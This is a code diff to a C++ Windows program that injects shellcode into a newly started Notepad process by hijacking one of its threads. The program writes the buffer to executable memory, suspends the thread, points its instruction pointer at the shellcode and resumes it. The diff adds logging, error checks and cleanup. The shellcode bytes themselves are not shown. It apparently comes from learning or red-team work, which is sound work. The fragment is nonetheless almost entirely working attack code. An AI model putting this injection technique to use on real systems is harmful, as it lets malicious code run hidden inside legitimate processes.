@@ -82,12 +82,21 @@ int main()
 	CONTEXT context;
 
 	DWORD targetPID = startNotePad();
+
+	if (targetPID == 0)
+	{
+		warn("Failed to start Notepad");
+		return 1;
+	}
+
 	context.ContextFlags = CONTEXT_FULL;
 	threadEntry.dwSize = sizeof(THREADENTRY32);
 
 	targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+	info("Got handle to process (%ld)", targetPID);
 	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+	info("Wrote shellcode to remote process memory");
 
 	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 	Thread32First(snapshot, &threadEntry);
@@ -97,15 +106,41 @@ int main()
 		if (threadEntry.th32OwnerProcessID == targetPID)
 		{
 			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+			info("Got handle to thread (%ld)", threadEntry.th32ThreadID);
 			break;
 		}
 	}
 
+	if (threadHijacked == NULL)
+	{
+		warn("Failed to get handle to thread");
+		return 1;
+	}
+
 	SuspendThread(threadHijacked);
+	info("Suspended thread (%ld)", threadEntry.th32ThreadID);
 
 	GetThreadContext(threadHijacked, &context);
+	info("Got thread context");
+
 	context.Rip = (DWORD_PTR)remoteBuffer;
 	SetThreadContext(threadHijacked, &context);
+	info("Set thread context");
 
 	ResumeThread(threadHijacked);
+	info("Resumed thread (%ld)", threadEntry.th32ThreadID);
+
+	//wait for button press to continue
+	std::cout << "Press any key to continue...";
+	std::cin.get();
+
+CLEANUP:
+	if (TerminateProcess(targetProcessHandle, 0)) {
+		info("Terminated Notepad process with PID: %d", targetPID);
+	}
+	else {
+		warn("Failed to terminate Notepad process with PID: %d", targetPID);
+	}
+	CloseHandle(targetProcessHandle);
+
 }
